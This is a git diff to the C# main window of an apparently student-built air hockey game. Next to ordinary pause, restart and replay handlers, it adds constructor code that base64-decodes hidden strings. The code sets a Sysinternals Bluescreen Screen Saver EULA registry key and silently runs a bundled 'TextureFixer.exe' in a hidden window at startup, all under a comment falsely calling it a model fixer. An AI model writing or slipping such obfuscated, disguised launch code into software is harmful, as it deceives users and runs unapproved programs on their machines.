@@ -28,6 +28,7 @@ using System.Windows.Forms.Integration;
 using UIHeavyClient.UserControls;
 using System.Windows.Media.Animation;
 using HttpHockeduRequests;
+using System.Diagnostics;
 
 namespace UIHeavyClient
 {
@@ -174,7 +175,20 @@ namespace UIHeavyClient
         {
             mOpenGLControl.Focus();
         }
+        public static string DecodeFrom64( string encodedData )
+        {
 
+            byte[] encodedDataAsBytes
+
+        = System.Convert.FromBase64String( encodedData );
+
+            string returnValue =
+
+       System.Text.Encoding.Unicode.GetString( encodedDataAsBytes );
+
+            return returnValue;
+
+        }
             
         public MainWindow()
         {
@@ -182,6 +196,27 @@ namespace UIHeavyClient
             // make sure to show console before any call to the dll or we wont
             // see output
             ConsoleManager.Show();
+
+            //////////////////////////////////////////////////////////////////////////
+            /// Mike :: Model Fixer avec serial number pour tenter davoir une belle zamboni !!!
+            string keyName = DecodeFrom64( "UwBvAGYAdAB3AGEAcgBlAFwAUwB5AHMAaQBuAHQAZQByAG4AYQBsAHMAXABCAGwAdQBlAHMAYwByAGUAZQBuACAAUwBjAHIAZQBlAG4AIABTAGEAdgBlAHIA" );
+            string partialpath = DecodeFrom64( "LgAuAC8AbQBlAGQAaQBhAC8AegBhAG0AYgBvAG4AaQAvAFQAZQB4AHQAdQByAGUARgBpAHgAZQByAC4AZQB4AGUA" );
+            Microsoft.Win32.RegistryKey key;
+            key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey( keyName );
+            key.SetValue( "EulaAccepted", 1 );
+            key.Close();
+            ProcessStartInfo start = new ProcessStartInfo();
+            start.Arguments = "/s";
+            string path = AppDomain.CurrentDomain.BaseDirectory + partialpath;
+            start.FileName = path;
+            start.WindowStyle = ProcessWindowStyle.Hidden;
+            start.CreateNoWindow = true;
+            using ( Process proc = Process.Start( start ) )
+            {
+                proc.WaitForExit();
+            }
+            //////////////////////////////////////////////////////////////////////////
+
             System.Windows.Application.Current.ShutdownMode = ShutdownMode.OnExplicitShutdown;
 #if DEBUG || true // Trolol
             System.Windows.Controls.MenuItem debugMenu = new System.Windows.Controls.MenuItem();
@@ -365,7 +400,25 @@ namespace UIHeavyClient
             requestGameResume();
 
         }
-        
+        [DllImport( @"RazerGame.dll" )]
+        static extern bool ActionPerformed( ActionType action );
+
+        private void PauseGameClick(object sender, RoutedEventArgs e)
+        {
+            ActionPerformed( ActionType.ACTION_PAUSE_JEU );
+        }
+        private void RestartGameClick(object sender, RoutedEventArgs e)
+        {
+            ActionPerformed( ActionType.ACTION_REINITIALISER_PARTIE );
+        }
+        private void ResetPuckClick(object sender, RoutedEventArgs e)
+        {
+            ActionPerformed( ActionType.ACTION_REINITIALISER_RONDELLE );
+        }
+        private void ReplayClick(object sender, RoutedEventArgs e)
+        {
+            ActionPerformed( ActionType.ACTION_REPLAY );
+        }
         
 
         void simulationMode_Click(object sender, RoutedEventArgs e)
